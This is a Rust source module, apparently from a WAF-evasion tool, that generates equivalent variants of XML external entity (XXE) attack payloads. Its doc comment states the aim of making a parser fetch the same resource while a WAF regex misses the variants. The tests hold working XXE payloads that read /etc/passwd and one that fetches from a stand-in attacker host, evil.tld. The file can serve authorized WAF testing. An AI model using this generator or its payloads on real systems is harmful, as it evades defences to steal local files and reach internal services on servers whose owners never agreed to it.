//! XXE (XML external entity) payload-string equivalence + the joint
//! `(payload × delivery)` generator — the xxe arm of Phase B.
//!
//! The sound equivalence is **external-id equivalence**: the set of
//! URIs an XML parser dereferences when expanding the DTD is invariant
//! under (a) the entity *name* (`&xxe;` vs `&z;`, consistently
//! renamed), (b) `SYSTEM "U"` vs `PUBLIC "any" "U"` (XML 1.0 §4.2.2 —
//! the public id is advisory; the system literal `U` is fetched), (c)
//! quote style `"U"` ↔ `'U'`, (d) DTD internal-subset whitespace, and
//! (e) the local-file spellings that denote the same path
//! (`file:///etc/passwd` ≡ `file://localhost/etc/passwd` ≡
//! `file:/etc/passwd`). Every form makes the parser fetch the SAME
//! resource while a WAF regex keyed on `<!ENTITY`/`SYSTEM`/`file://`
//! misses the variants.
//!
//! Anti-rig: the fetched URI(s) — the actual exfil/SSRF target — are
//! preserved verbatim and re-verified ([`still_exfils`]). Swapping
//! `/etc/passwd`→`/etc/shadow` or the attacker host is a different
//! exploit and is rejected.

use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};

/// Canonicalise a fetched URI: lowercase scheme, fold the equivalent
/// local-file spellings to `file:<abs-path>`.
fn canon_uri(u: &str) -> String {
    let t = u.trim();
    let lower_scheme = match t.split_once(':') {
        Some((sc, rest)) => format!("{}:{rest}", sc.to_ascii_lowercase()),
        None => t.to_string(),
    };
    if let Some(rest) = lower_scheme.strip_prefix("file:") {
        let p = rest
            .trim_start_matches("//localhost")
            .trim_start_matches("//")
            .trim_start_matches('/');
        return format!("file:/{p}");
    }
    lower_scheme
}

/// All URIs the DTD would make the parser fetch (SYSTEM literal, or the
/// 2nd literal of a PUBLIC external id), canonicalised + sorted.
fn fetched_uris(s: &str) -> Vec<String> {
    let up = s.to_ascii_uppercase();
    let b: Vec<char> = s.chars().collect();
    let mut uris = Vec::new();
    let mut i = 0;
    while i < b.len() {
        let kind = if up[i..].starts_with("SYSTEM") {
            Some(1usize)
        } else if up[i..].starts_with("PUBLIC") {
            Some(2usize)
        } else {
            None
        };
        if let Some(nliterals) = kind {
            let mut j = i + 6;
            let mut lit = String::new();
            let mut found = 0;
            while j < b.len() && found < nliterals {
                if b[j] == '"' || b[j] == '\'' {
                    let q = b[j];
                    j += 1;
                    lit.clear();
                    while j < b.len() && b[j] != q {
                        lit.push(b[j]);
                        j += 1;
                    }
                    found += 1;
                    j += 1;
                } else {
                    j += 1;
                }
            }
            if found == nliterals && !lit.is_empty() {
                uris.push(canon_uri(&lit));
            }
            i = j;
            continue;
        }
        i += 1;
    }
    uris.sort();
    uris.dedup();
    uris
}

fn is_xxe(s: &str) -> bool {
    let up = s.to_ascii_uppercase();
    up.contains("<!ENTITY") && (up.contains("SYSTEM") || up.contains("PUBLIC")) && !fetched_uris(s).is_empty()
}

/// True iff `cand` still makes the parser fetch exactly the same
/// resource set as `original` (and is still a DTD/entity attack).
#[must_use]
pub fn still_exfils(original: &str, cand: &str) -> bool {
    if cand.trim().is_empty() || !is_xxe(original) {
        return false;
    }
    let up = cand.to_ascii_uppercase();
    if !up.contains("<!ENTITY") {
        return false;
    }
    let (o, c) = (fetched_uris(original), fetched_uris(cand));
    !o.is_empty() && o == c
}

// ── rewrites (parser-transparent, WAF-opaque) ──────────────────────

/// Rename every `<!ENTITY <name> ...>` / `&<name>;` / `%<name>;`
/// consistently — the expansion is identical.
fn rw_rename_entity(s: &str, rng: &mut Rng) -> Option<String> {
    let i = s.find("<!ENTITY")?;
    let after = &s[i + 8..];
    let after = after.trim_start();
    let pct = after.starts_with('%');
    let a2 = after.trim_start_matches('%').trim_start();
    let name: String = a2.chars().take_while(|c| c.is_ascii_alphanumeric() || *c == '_').collect();
    if name.is_empty() {
        return None;
    }
    let newname = format!("e{}", rng.next_u64() % 100000);
    let mut out = s.replace(&format!("&{name};"), &format!("&{newname};"));
    out = out.replace(&format!("%{name};"), &format!("%{newname};"));
    // the declaration token (name preceded by <!ENTITY [%])
    let decl_old = if pct {
        format!("% {name}")
    } else {
        format!("ENTITY {name}")
    };
    let decl_new = if pct {
        format!("% {newname}")
    } else {
        format!("ENTITY {newname}")
    };
    out = out.replacen(&decl_old, &decl_new, 1);
    (out != s).then_some(out)
}

/// `SYSTEM "U"` → `PUBLIC "-//x//y" "U"` (same fetched system literal).
fn rw_system_to_public(s: &str) -> Option<String> {
    let i = s.find("SYSTEM")?;
    let rest = &s[i + 6..];
    let q = rest.find(['"', '\''])?;
    let out = format!("{}PUBLIC \"-//wafrift//dtd//EN\" {}", &s[..i], &rest[q..]);
    (fetched_uris(&out) == fetched_uris(s)).then_some(out)
}

/// Swap the quote style of external-id literals (`"U"` ↔ `'U'`).
fn rw_quote_swap(s: &str) -> Option<String> {
    if s.contains('"') && !s.contains('\'') {
        Some(s.replace('"', "'"))
    } else if s.contains('\'') && !s.contains('"') {
        Some(s.replace('\'', "\""))
    } else {
        None
    }
}

/// Equivalent local-file spelling (only when the original is a
/// `file:` URI — same absolute path).
fn rw_file_spelling(s: &str, rng: &mut Rng) -> Option<String> {
    let uris = fetched_uris(s);
    let canon = uris.iter().find(|u| u.starts_with("file:/"))?;
    let path = canon.strip_prefix("file:/")?;
    let alt = match rng.below(3) {
        0 => format!("file:///{path}"),
        1 => format!("file://localhost/{path}"),
        _ => format!("file:/{path}"),
    };
    // replace the first file: literal we can find
    for q in ['"', '\''] {
        for orig in [
            format!("{q}file:///{path}{q}"),
            format!("{q}file://localhost/{path}{q}"),
            format!("{q}file:/{path}{q}"),
        ] {
            if s.contains(&orig) {
                let out = s.replacen(&orig, &format!("{q}{alt}{q}"), 1);
                if out != s && fetched_uris(&out) == uris {
                    return Some(out);
                }
            }
        }
    }
    None
}

/// Insert insignificant whitespace into the DTD declaration.
fn rw_dtd_ws(s: &str, rng: &mut Rng) -> Option<String> {
    let ws = *rng.pick(&["  ", "\t", "\n", " \n  "]);
    let out = s.replacen("<!ENTITY", &format!("<!ENTITY{ws}"), 1);
    (out != s).then_some(out)
}

#[must_use]
pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    let mut rng = Rng::new(cfg.seed);
    let all = super::sql::delivery_set(&cfg.param);
    let (deliveries, single_forced) = match cfg.force_delivery {
        Some(i) if i < all.len() => (vec![all[i].clone()], true),
        _ => (all, false),
    };
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out: Vec<EquivPayload> = Vec::new();

    if !still_exfils(payload, payload) {
        return out;
    }

    for d in &deliveries {
        if !cfg.vary_delivery && !single_forced && !matches!(d, DeliveryShape::Query { .. }) {
            continue;
        }
        let key = format!("{}\u{1}{}", payload, d.label());
        if seen.insert(key) {
            out.push(EquivPayload {
                payload: payload.to_string(),
                delivery: d.clone(),
                dialect: Dialect::Generic,
                rules: vec!["identity"],
            });
        }
    }

    let mut attempts = 0;
    while out.len() < cfg.max && attempts < cfg.max * 24 + 64 {
        attempts += 1;
        let mut s = payload.to_string();
        let mut rules: Vec<&'static str> = Vec::new();
        if rng.chance(3, 5) {
            if let Some(n) = rw_rename_entity(&s, &mut rng) {
                s = n;
                rules.push("entity_rename");
            }
        }
        if rng.chance(1, 2) {
            if let Some(n) = rw_system_to_public(&s) {
                s = n;
                rules.push("system_to_public");
            }
        }
        if rng.chance(2, 5) {
            if let Some(n) = rw_file_spelling(&s, &mut rng) {
                s = n;
                rules.push("file_spelling");
            }
        }
        if rng.chance(1, 3) {
            if let Some(n) = rw_quote_swap(&s) {
                s = n;
                rules.push("quote_swap");
            }
        }
        if rng.chance(1, 3) {
            if let Some(n) = rw_dtd_ws(&s, &mut rng) {
                s = n;
                rules.push("dtd_whitespace");
            }
        }
        if rules.is_empty() {
            continue;
        }
        if !still_exfils(payload, &s) {
            continue;
        }
        let d = if cfg.vary_delivery || single_forced {
            rng.pick(&deliveries).clone()
        } else {
            DeliveryShape::Query {
                param: cfg.param.clone(),
            }
        };
        let key = format!("{s}\u{1}{}", d.label());
        if !seen.insert(key) {
            continue;
        }
        out.push(EquivPayload {
            payload: s,
            delivery: d,
            dialect: Dialect::Generic,
            rules,
        });
    }
    out.truncate(cfg.max);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(seed: u64) -> EquivConfig {
        EquivConfig {
            seed,
            max: 40,
            verify: true,
            vary_delivery: true,
            param: "xml".into(),
            force_delivery: None,
        }
    }

    const ATK: &str =
        r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>"#;

    #[test]
    fn fetched_uri_is_invariant_under_sound_rewrites() {
        assert_eq!(fetched_uris(ATK), vec!["file:/etc/passwd".to_string()]);
        // SYSTEM≡PUBLIC, quote swap, file spelling, rename — same fetch
        for v in [
            r#"<!DOCTYPE r [<!ENTITY z SYSTEM 'file:///etc/passwd'>]><r>&z;</r>"#,
            r#"<!DOCTYPE r [<!ENTITY xxe PUBLIC "-//x//EN" "file:///etc/passwd">]><r>&xxe;</r>"#,
            r#"<!DOCTYPE r [<!ENTITY xxe SYSTEM "file://localhost/etc/passwd">]><r>&xxe;</r>"#,
            r#"<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:/etc/passwd">]><r>&xxe;</r>"#,
        ] {
            assert!(still_exfils(ATK, v), "not equiv: {v}");
        }
    }

    #[test]
    fn target_swap_is_rejected() {
        assert!(!still_exfils(
            ATK,
            r#"<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><r>&xxe;</r>"#
        ));
        assert!(!still_exfils(
            r#"<!DOCTYPE r [<!ENTITY x SYSTEM "http://evil.tld/a">]><r>&x;</r>"#,
            r#"<!DOCTYPE r [<!ENTITY x SYSTEM "http://other.tld/a">]><r>&x;</r>"#
        ));
    }

    #[test]
    fn non_xxe_and_empty_emit_nothing() {
        assert!(generate("", &cfg(1)).is_empty());
        assert!(generate("<r>hello</r>", &cfg(1)).is_empty());
        assert!(generate(r#"<!DOCTYPE r><r>x</r>"#, &cfg(1)).is_empty()); // no entity
    }

    #[test]
    fn deterministic_diverse_and_all_sound() {
        let a: Vec<_> = generate(ATK, &cfg(8)).into_iter().map(|m| m.payload).collect();
        let b: Vec<_> = generate(ATK, &cfg(8)).into_iter().map(|m| m.payload).collect();
        assert_eq!(a, b);
        assert!(a.iter().collect::<std::collections::HashSet<_>>().len() >= 5);
        for seed in 0..30u64 {
            for m in generate(ATK, &cfg(seed)) {
                assert!(still_exfils(ATK, &m.payload), "UNSOUND {:?}", m.payload);
            }
        }
    }
}
